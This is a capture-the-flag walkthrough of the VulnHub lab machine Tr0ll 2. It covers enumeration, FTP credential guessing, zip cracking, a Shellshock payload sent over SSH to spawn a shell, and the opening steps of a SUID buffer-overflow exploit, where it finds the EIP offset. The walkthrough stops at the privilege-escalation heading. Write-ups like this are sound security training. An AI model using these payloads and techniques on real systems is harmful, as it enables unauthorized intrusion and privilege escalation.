#### about : basics machines, shellshock in ssh , Bufferoverflows linux based 
[machine link](https://www.vulnhub.com/entry/tr0ll-2,107/)

## scanning

First we need to get the machine IP address , we can start with :
```bash
sudo netdiscover -i eth0
```
```                                                             
192.168.80.138  00:0c:29:c7:cb:ee      1      60  VMware, Inc.                                                             
```

now we have the target IP , so we can start scannig the services running :

```bash
nmap -A -T4 192.168.80.138 -oN nmap.intial

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 82:fe:93:b8:fb:38:a6:77:b5:a6:25:78:6b:35:e2:a8 (DSA)
|   2048 7d:a5:99:b8:fb:67:65:c9:64:86:aa:2c:d6:ca:08:5d (RSA)
|_  256 91:b8:6a:45:be:41:fd:c8:14:b5:02:a0:66:7c:8c:96 (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Performing full port scan we got nothing new , so we can say scanning step has finished , we may need to run a UDP scan in case we reached a deadend with these services

## Enumeration

**Starting with the http service :**

- we only got a troll image , source code contains `Author: Tr0ll` , `Editor: VIM` we may use them latter
- run directory bruteforce :
```bash
ffuf -c -w /opt/large-wordlist.txt -u http://192.168.80.138/FUZZ

cgi-bin/                [Status: 403, Size: 290, Words: 21, Lines: 11]
index.html              [Status: 200, Size: 110, Words: 7, Lines: 7]
robots.txt              [Status: 200, Size: 346, Words: 1, Lines: 24]
server-status           [Status: 403, Size: 295, Words: 21, Lines: 11]
```
- at `robots.txt` we can find potential pages which we can add in a list and run ffuf again to see what is valid and what is rabbit hole:
```bash
ffuf -c -w wordlist.txt -u http://192.168.80.138/FUZZ 

keep_trying             [Status: 301, Size: 322, Words: 20, Lines: 10]
dont_bother             [Status: 301, Size: 322, Words: 20, Lines: 10]
ok_this_is_it           [Status: 301, Size: 324, Words: 20, Lines: 10]
noob                    [Status: 301, Size: 315, Words: 20, Lines: 10]
```
- checking all of them , all contain same image we can download the image and check if it is differs from page to another 

```bash
for i in `cat valid_from_robots.txt` ;do curl  http://192.168.80.138/$i/cat_the_troll.jpg -o $i.jpg ;done
```
```bash
ls -la *.jpg
-rw-r--r-- 1 kali kali 15873 Aug 22 22:16 dont_bother.jpg
-rw-r--r-- 1 kali kali 15831 Aug 22 22:16 keep_trying.jpg
-rw-r--r-- 1 kali kali 15831 Aug 22 22:16 noob.jpg
-rw-r--r-- 1 kali kali 15831 Aug 22 22:16 ok_this_is_it.jpg
```

one of them has different size , running strings on it we got at last line :
```
Look Deep within y0ur_self for the answer
```

- checking `http://192.168.80.138/y0ur_self/` we got listed directory with the file `answer.txt` inside which we can download 
- file `answer.txt` contains alot of base64 encoded strings with duplicates 
- clean results maybe it is a list we can use for bruteforcing other services
```bash
for i in `cat answer.txt ` ;do  echo $i | base64 -d  >> output.txt;done
cat output.txt | uniq > uniqued.txt
```
- now i think we got all what we can do for the http service 

**ftp-service**

- anonymous login is not allowed , we can try the username `Tr0ll` that we have found earlier in the web page source code and type it as password as well
- we have logged in successfully with `Tr0ll:Tr0ll` , we have found :
```bash
-rw-r--r--    1 0        0            1474 Oct 04  2014 lmao.zip
```
- we can download using `get lmao.zip`
- the file is protected and needs a password , we can bruteforce password from the list we have obtained eariler 

```bash
fcrackzip -D -p uniq_output.txt -u  lmao.zip
PASSWORD FOUND!!!!: pw == ItCantReallyBeThisEasyRightLOL
```
- now we can extract the zip file and we have found `noob` ssh private keys which we can use to login

## Foothold

```bash
ssh noob@192.168.80.138 -i noob 
```
we got output :
```
TRY HARDER LOL!
```
we can imagine the implemnetation in the machine is that when a user tries to ssh echo 'TRY HARDER LOL!' and exit  , and this echo line is a prefix in the Authorized_keys 
searching about that will find [here](https://unix.stackexchange.com/questions/157477/how-can-shellshock-be-exploited-over-ssh) talking about the exploitation of that

```bash
ssh noob@192.168.80.138 -i noob '() { :;}; echo MALICIOUS CODE'  
MALICIOUS CODE
TRY HARDER LOL!
```
spawn a shell :
```bash
ssh noob@192.168.80.138 -i noob '() { :;}; /bin/bash'
 ```
 and indeed :
 
 ![image](https://user-images.githubusercontent.com/67979878/186057505-3d9642e6-db7b-4c44-8c62-ad2530705792.png)

## Post Exploiation

- to have a stable shell remove the `command="echo TRY HARDER LOL!" ` From the `authorized_keys` then ssh normally
- let's search for juicy stuff to gain the root access , we find no sudo for our user so we can start with SUIDs

```bash
find / -type f -user root -perm -4000 -exec ls -l {} + 2>/dev/null
...
-rwsr-xr-x 1 root root         7273 Oct  5  2014 /nothing_to_see_here/choose_wisely/door1/r00t
-rwsr-xr-x 1 root root         8401 Oct  5  2014 /nothing_to_see_here/choose_wisely/door2/r00t
-rwsr-xr-x 1 root root         7271 Oct  5  2014 /nothing_to_see_here/choose_wisely/door3/r00t
...
```

- Trying to execute the 3 of the r00t binaries , one of them will lock us for 2 mins and the other one will do nothing. the third one accepts an input and prints it back
- we should think of BoF as it prints the string back . let's try large string

```bash
./r00t  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
```
- we can download the bianry and examine it at our kali box 

```bash
scp -i noob noob@192.168.80.138:/nothing_to_see_here/choose_wisely/door2/r00t r00t
```

**Exploiting Buffer over flow [using EDB]**

- trying until length=300 the binary returns segmentation fault and the EIP is overwritten 

![image](https://user-images.githubusercontent.com/67979878/186060572-36e4562f-72de-496f-b24d-eb5c7cccccb9.png)

- now we want to get the **offset** until the EIP is overwritten :

```bash
# generate unique pattern
msf-pattern_create -l 300
msf-pattern_offset -q 6a413969 -l 300
[*] Exact match at offset 268
```
- confirm results :
```bash
 python3 -c 'print("A"*268+"BBBB")'
 ```
 Sending this output in EDB we got EIP=42424242 , so confirmed 

- we want to get the JMP ESP instruction address so we can inject our shellcode at 

## Privilege esclation
